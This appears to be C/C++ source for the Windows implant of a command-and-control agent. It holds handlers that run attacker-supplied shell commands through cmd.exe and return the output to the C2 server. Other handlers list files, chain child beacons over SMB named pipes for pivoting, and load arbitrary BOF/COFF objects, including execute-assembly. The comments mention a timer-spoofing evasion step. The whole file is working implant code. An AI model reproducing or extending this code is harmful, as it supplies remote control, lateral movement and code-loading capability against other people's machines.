#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Bof.h>

// Send a taks result back to C2
// task_uuid: the 36-byte UUID from the inbound taks (tells server which task this answers)
// data / len: output bytes to send (can be nullptr if no output)

static void Task_SendResult( PCHAR task_uuid, PVOID data, UINT32 len )
{
    G_AGENT;

    PPACKAGE pkg = Pkg_Create( Self->Config.AgentUUID );
    if ( !pkg  ) return;

    pkg->TaskUUID = task_uuid;

    // write the task UUID into the packet so the server can match it
    Pkg_Pad( pkg, task_uuid, 36 );

    if ( data && len > 0 )
    {
        Pkg_Bytes( pkg, data, len );
    }

    PVOID resp = nullptr;
    UINT32 resp_size = 0;
    Pkg_Transmit( pkg, &resp, &resp_size );
    Pkg_Destroy( pkg );
}

// command handlers

// Exit - terminate the current process immediately
static void Task_Exit( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;
    // Send EXIT_MAGIC so the server can call TsAgentTerminate on receipt.
    BYTE confirm = EXIT_MAGIC;
    Task_SendResult( task_uuid, &confirm, 1 );
    Self->Ntdll.NtAllocateVirtualMemory( (HANDLE)-1, nullptr, 0, nullptr, 0, 0 );
    Self->Krnl32.TerminateProcess( (HANDLE)-1, 0 );
}

// Unlink - close the named-pipe channel to a child SMB beacon.
// args: [str pivot_uuid]  result: [36B pivot_uuid] (echo, so server knows which child)
static void Task_Unlink( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;
    UINT32 uuid_len   = 0;
    PCHAR  pivot_uuid = Psr_Str( args, &uuid_len );
    if ( !pivot_uuid || uuid_len < 36 ) return;

    PAIN_SMB_DATA* child = (PAIN_SMB_DATA*)Smb_Get( pivot_uuid );
    if ( child ) Smb_Rm( child );

    Task_SendResult( task_uuid, pivot_uuid, 36 );
}

// PWD - Return the current working directory
static void Task_Pwd( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    CHAR buf[512];
    Mem_Set( buf, 0, sizeof(buf) );
    DWORD len = Self->Krnl32.GetCurrentDirectoryA( sizeof(buf), buf );

    Task_SendResult( task_uuid, buf, len );
}

// Shell - run a command via cmd.exe /c, capture stdout+stderr, send output
static void Task_Shell( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    // read the command string from the args parser
    UINT32 cmd_len = 0;
    PCHAR cmd_str = Psr_Str( args, &cmd_len );
    if ( !cmd_str || cmd_len == 0 ) return;

    // build "cmd.exe /c <command>" on the stack
    // max command length we support
    CHAR cmdline[1024];
    Mem_Set( cmdline, 0, sizeof(cmdline) );

    CHAR prefix[] = { 'c','m','d','.','e','x','e',' ','/','c',' ',0 };
    UINT32 i = 0;
    while ( prefix[i] )
    {
        cmdline[i] = prefix[i];
        i++;
    }
    UINT32 j = 0;
    while ( j < cmd_len && i < sizeof(cmdline) - 1 )
    {
        cmdline[i++] = cmd_str[j++];
    }

    //create a pipe for stdout/stderr
    HANDLE h_read = nullptr;
    HANDLE h_write = nullptr;

    SECURITY_ATTRIBUTES sa;
    Mem_Set( &sa, 0, sizeof(sa) );
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if ( !Self->Krnl32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) return;

    STARTUPINFOA si;
    Mem_Set( &si, 0, sizeof(si) );
    si.cb           = sizeof(si);
    si.dwFlags      = STARTF_USESTDHANDLES;
    si.hStdOutput   = h_write;
    si.hStdError    = h_write;
    si.hStdInput    = nullptr;

    PROCESS_INFORMATION pi;
    Mem_Set( &pi, 0, sizeof(pi) );

    BOOL ok = Self->Krnl32.CreateProcessA(
        nullptr,    // no explicit exe path - cmd.exe is in the cmdline
        cmdline,
        nullptr,    // default process security
        nullptr,    // default thread secruity
        TRUE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    // Close the write end in our process - the child own it now
    // if we keep it open, ReadFile belwo will never get EOF
    Self->Krnl32.CloseHandle( h_write );

    if ( !ok )
    {
        Self->Krnl32.CloseHandle( h_read );
        return;
    }

    // Wait for the process to finish
    Self->Krnl32.WaitForSingleObject( pi.hProcess, 30000 ); // 30s timeout

    // read all output from the pipe
    UINT32 total = 0;
    UINT32 cap = 4096;
    PBYTE buf = (PBYTE)Heap_Alloc( cap );

    if ( buf )
    {
        DWORD chunk = 0;
        do
        {
            if ( total + 4096 > cap )
            {
                cap += 4096;
                buf = (PBYTE)Heap_Realloc( buf, cap );
                if ( !buf ) break;
            }
            chunk = 0;
            Self->Krnl32.ReadFile( h_read, buf + total, 4096, &chunk, nullptr );
            total += chunk;
        } while ( chunk > 0 );

        Task_SendResult( task_uuid, buf, total );
        Heap_Free( buf );
    }

    Self->Krnl32.CloseHandle( h_read );
    Self->Krnl32.CloseHandle( pi.hProcess );
    Self->Krnl32.CloseHandle( pi.hThread );
}

// Ls - list files in a directory (or current dir if no arg)
static void Task_Ls( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    // read optional path argument
    UINT32 path_len = 0;
    PCHAR  path_str = Psr_Str( args, &path_len );

    // build the search pattern: "<path>\*" or ".\*"
    CHAR pattern[512];
    Mem_Set( pattern, 0, sizeof(pattern) );

    if ( path_str && path_len > 0 ) {
        UINT32 i = 0;
        while ( i < path_len && i < sizeof(pattern) - 3 ) { pattern[i] = path_str[i]; i++; }
        pattern[i++] = '\\';
        pattern[i++] = '*';
    } else {
        pattern[0] = '.'; pattern[1] = '\\'; pattern[2] = '*';
    }

    // output buffer - grows as we find entries
    UINT32 out_cap = 4096;
    UINT32 out_len = 0;
    PCHAR  out_buf = (PCHAR)Heap_Alloc( out_cap );
    if ( !out_buf ) return;

    WIN32_FIND_DATAA fd;
    Mem_Set( &fd, 0, sizeof(fd) );

    HANDLE h = Self->Krnl32.FindFirstFileA( pattern, &fd );
    if ( h == INVALID_HANDLE_VALUE ) {
        Task_SendResult( task_uuid, out_buf, 0 );
        Heap_Free( out_buf );
        return;
    }

    do {
        // format one line: "<name>\t<size>\n"
        CHAR line[300];
        Mem_Set( line, 0, sizeof(line) );

        // copy filename
        UINT32 li = 0;
        UINT32 ni = 0;
        while ( fd.cFileName[ni] && li < sizeof(line) - 20 ) line[li++] = fd.cFileName[ni++];

        line[li++] = '\t';

        // file size as decimal (directories show 0)
        UINT32 size = fd.nFileSizeLow;
        if ( fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) {
            line[li++] = '<'; line[li++] = 'd'; line[li++] = 'i'; line[li++] = 'r'; line[li++] = '>';
        } else {
            // write size digits
            CHAR digits[12];
            Mem_Set( digits, 0, sizeof(digits) );
            INT32 di = 10;
            if ( size == 0 ) { digits[10] = '0'; di = 10; }
            else {
                UINT32 tmp = size;
                while ( tmp > 0 ) { digits[di--] = '0' + (tmp % 10); tmp /= 10; }
                di++;
            }
            while ( di <= 10 ) line[li++] = digits[di++];
        }

        line[li++] = '\n';

        // grow output buffer if needed
        if ( out_len + li + 1 > out_cap ) {
            out_cap += 4096;
            out_buf  = (PCHAR)Heap_Realloc( out_buf, out_cap );
            if ( !out_buf ) break;
        }

        Mem_Copy( out_buf + out_len, line, li );
        out_len += li;

    } while ( Self->Krnl32.FindNextFileA( h, &fd ) );

    Self->Krnl32.FindClose( h );
    Task_SendResult( task_uuid, out_buf, out_len );
    Heap_Free( out_buf );
}

// Link - open a child SMB beacon's named pipe, read its checkin, relay to C2
static void Task_Link( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    UINT32 path_len  = 0;
    PCHAR  pipe_path = Psr_Str( args, &path_len );
    if ( !pipe_path || path_len == 0 ) {
        Task_SendResult( task_uuid, nullptr, 0 );
        return;
    }

    PAIN_SMB_DATA* node = (PAIN_SMB_DATA*)Smb_Add( pipe_path );
    if ( !node ) {
        // A single 0xFF byte signals failure without matching the link magic
        BYTE fail = 0xFF;
        Task_SendResult( task_uuid, &fail, 1 );
        return;
    }

    // Build result: [0x4C 'L'][node->CheckinBuf]
    // CheckinBuf = [36B child UUID][checkin payload] - exactly what InternalHandler expects.
    // The Go processData detects 0x4C to route child registration to the SMB listener.
    UINT32 result_len = 1 + node->CheckinLen;
    PBYTE  result     = (PBYTE)Heap_Alloc( result_len );
    if ( !result ) return;

    result[0] = 0x4C;
    Mem_Copy( result + 1, node->CheckinBuf, node->CheckinLen );

    Task_SendResult( task_uuid, result, result_len );
    Heap_Free( result );
}

// Pivot - relay pending tasks to an SMB child and collect its results.
// args: [str pivot_uuid][bytes relay_data]
// result sent to Go: [0x50][36B child_uuid][encrypted_child_body]
static void Task_Pivot( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    UINT32 uuid_len   = 0;
    PCHAR  pivot_uuid = Psr_Str( args, &uuid_len );
    if ( !pivot_uuid || uuid_len < 36 ) {
        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: missing pivot UUID\n" );
        return;
    }

    UINT32 relay_len  = 0;
    PBYTE  relay_data = Psr_Bytes( args, &relay_len );
    if ( !relay_data || relay_len == 0 ) {
        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: no relay data\n" );
        return;
    }

    PAIN_SMB_DATA* child = (PAIN_SMB_DATA*)Smb_Get( pivot_uuid );
    if ( !child || !child->Handle ) {
        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child not found for %s\n", pivot_uuid );
        return;
    }

    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: writing %d bytes to child %s\n", relay_len, pivot_uuid );

    // Write [4B len][relay_data] to child pipe
    UINT32 write_total = sizeof(UINT32) + relay_len;
    PBYTE  write_buf   = (PBYTE)Heap_Alloc( write_total );
    if ( !write_buf ) return;
    Mem_Copy( write_buf,                  &relay_len, sizeof(UINT32) );
    Mem_Copy( write_buf + sizeof(UINT32), relay_data, relay_len      );

    DWORD written = 0;
    BOOL  wok     = Self->Krnl32.WriteFile( child->Handle, write_buf, write_total, &written, nullptr );
    Heap_Free( write_buf );
    if ( !wok ) {
        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: WriteFile failed - child dead\n" );
        Smb_Rm( child );
        PBYTE dead = (PBYTE)Heap_Alloc( 1 + 36 );
        if ( dead ) {
            dead[0] = PIVOT_DEAD_MAGIC;
            Mem_Copy( dead + 1, pivot_uuid, 36 );
            Task_SendResult( task_uuid, dead, 1 + 36 );
            Heap_Free( dead );
        }
        return;
    }

    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: wrote %d bytes, waiting for child response\n", relay_len );

    // Wait for child to process and write response
    DWORD peek_len = 0;
    while ( TRUE ) {
        if ( !Self->Krnl32.PeekNamedPipe( child->Handle, nullptr, 0, nullptr, &peek_len, nullptr ) ) {
            Self->Ntdll.DbgPrint( "[PIVOT] Exchange: PeekNamedPipe failed - child dead\n" );
            Smb_Rm( child );
            PBYTE dead = (PBYTE)Heap_Alloc( 1 + 36 );
            if ( dead ) {
                dead[0] = PIVOT_DEAD_MAGIC;
                Mem_Copy( dead + 1, pivot_uuid, 36 );
                Task_SendResult( task_uuid, dead, 1 + 36 );
                Heap_Free( dead );
            }
            return;
        }
        if ( peek_len >= sizeof(UINT32) ) break;
        Self->Krnl32.Sleep( 100 );
    }

    // Read child's full response: [4B pkg_len][36B child_uuid][XOR(task_uuid+result)]
    PBYTE read_buf = (PBYTE)Heap_Alloc( peek_len );
    if ( !read_buf ) return;

    DWORD read_len = 0;
    BOOL  rok      = Self->Krnl32.ReadFile( child->Handle, read_buf, peek_len, &read_len, nullptr );
    if ( !rok || read_len <= sizeof(UINT32) ) {
        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: ReadFile failed or too small\n" );
        Heap_Free( read_buf );
        if ( !rok ) {
            Smb_Rm( child );
            PBYTE dead = (PBYTE)Heap_Alloc( 1 + 36 );
            if ( dead ) {
                dead[0] = PIVOT_DEAD_MAGIC;
                Mem_Copy( dead + 1, pivot_uuid, 36 );
                Task_SendResult( task_uuid, dead, 1 + 36 );
                Heap_Free( dead );
            }
        }
        return;
    }

    // Strip 4-byte length prefix → body = [36B child_uuid][encrypted_payload]
    UINT32 body_len = read_len - sizeof(UINT32);
    PBYTE  body     = read_buf + sizeof(UINT32);

    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: got %d-byte response from child\n", body_len );

    // Build relay result: [1B PIVOT_RESULT_MAGIC][body]
    UINT32 result_len = 1 + body_len;
    PBYTE  result     = (PBYTE)Heap_Alloc( result_len );
    if ( result ) {
        result[0] = PIVOT_RESULT_MAGIC;
        Mem_Copy( result + 1, body, body_len );
        Task_SendResult( task_uuid, result, result_len );
        Heap_Free( result );
    }
    Heap_Free( read_buf );
}

// BOF Execute - laod a COFF .o file, run go(), send output back
static void Task_Bof( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    // first arg: the raw .o file bytes
    UINT32 bof_size = 0;
    PBYTE bof_data = Psr_Bytes( args, &bof_size );
    if ( !bof_data || bof_size == 0 ) return;

    // second arg: packed arguments for the BOF (may be empty)
    UINT32 arg_size = 0;
    PBYTE arg_data = Psr_Bytes( args, & arg_size );

    // zero the output accumulator before running
    Self->Bof.OutputBuf = nullptr;
    Self->Bof.OutputLen = 0;
    Self->Bof.OutputCap = 0;
    // flag the main loop to skip Timer Spoof for one cycle after this BOF completes:
    // execute-assembly leaves CLR thread pool threads alive; NtSetContextThread manipulation
    // in Timer Spoof conflicts with CLR's thread interception and crashes the process.
    Self->Bof.BofRan = TRUE;

    // COM must be initialized for BOFs that use CLR (execute-assembly) or OLEAUT32.
    // CoInitializeEx returns S_FALSE if already initialized - safe to call every time.
    typedef HRESULT (WINAPI *fnCoInitializeEx)(LPVOID, DWORD);
    PVOID hOle32 = (PVOID)Self->Krnl32.LoadLibraryA( (PCHAR)"ole32.dll" );
    if ( hOle32 ) {
        auto CoInitEx = (fnCoInitializeEx)Self->Krnl32.GetProcAddress( (HMODULE)hOle32, (PCHAR)"CoInitializeEx" );
        if ( CoInitEx ) CoInitEx( nullptr, 0x0 ); // COINIT_MULTITHREADED
    }

    // run the BOF
    // The pipe handle is protected for its entire lifetime (see Smb.cc CreateNamedPipeA).
    // No bracket needed here - protection persists through CLR cleanup threads.
    Bof_Loader( bof_data, bof_size, arg_data, arg_size );

    // send whatever the BOF printed via BeaconOutput/BeaconPrintf
    Task_SendResult( task_uuid, Self->Bof.OutputBuf, Self->Bof.OutputLen );

    // free the output buffer
    if ( Self->Bof.OutputBuf ) Heap_Free( Self->Bof.OutputBuf );
    Self->Bof.OutputBuf = nullptr;
    Self->Bof.OutputLen = 0;
    Self->Bof.OutputCap = 0;

}

// Dispatcher

// Parse the server's poll response and dispatch each task to its handler
// Wire format: [int32 count] then for each task: [36-byte UUID][int32 cmdID][bytes args]
DECLFN BOOL Task_Dispatch( PVOID buf, UINT32 buf_len )
{
    if ( !buf || buf_len < 4 ) return FALSE;

    PARSER psr;
    Mem_Set( &psr, 0, sizeof(psr) );
    Psr_New( &psr, buf, buf_len );

    INT32 count = Psr_Int32( &psr );
    if ( count <= 0 ) { Psr_Destroy( &psr ); return TRUE; }

    for ( INT32 i = 0; i < count; i++ )
    {
        // read 36-byte task UUID (raw, no length prefix)
        if ( psr.Length < 36 ) break;
        PCHAR task_uuid = psr.Buffer;
        Psr_Pad( &psr, 36 );

        // command ID
        INT32 cmd_id = Psr_Int32( &psr );

        // argument blob - length-prefixed bytes
        UINT32 arg_size = 0;
        PBYTE  arg_data = Psr_Bytes( &psr, &arg_size );

        // build a sub-parser over just the argument bytes
        PARSER args;
        Mem_Set( &args, 0, sizeof(args) );
        if ( arg_data && arg_size > 0 )
            Psr_New( &args, arg_data, arg_size );

        switch ( cmd_id )
        {
            case CMD_EXIT:   Task_Exit  ( task_uuid, &args ); break;
            case CMD_SHELL:  Task_Shell ( task_uuid, &args ); break;
            case CMD_PWD:    Task_Pwd   ( task_uuid, &args ); break;
            case CMD_LS:     Task_Ls    ( task_uuid, &args ); break;
            case CMD_BOF:    Task_Bof   ( task_uuid, &args ); break;
            case CMD_LINK:   Task_Link  ( task_uuid, &args ); break;
            case CMD_PIVOT:  Task_Pivot ( task_uuid, &args ); break;
            case CMD_UNLINK:      Task_Unlink     ( task_uuid, &args ); break;
            default: break;
        }

        if ( arg_data && arg_size > 0 )
            Psr_Destroy( &args );
    }

    Psr_Destroy( &psr );
    return TRUE;
}
















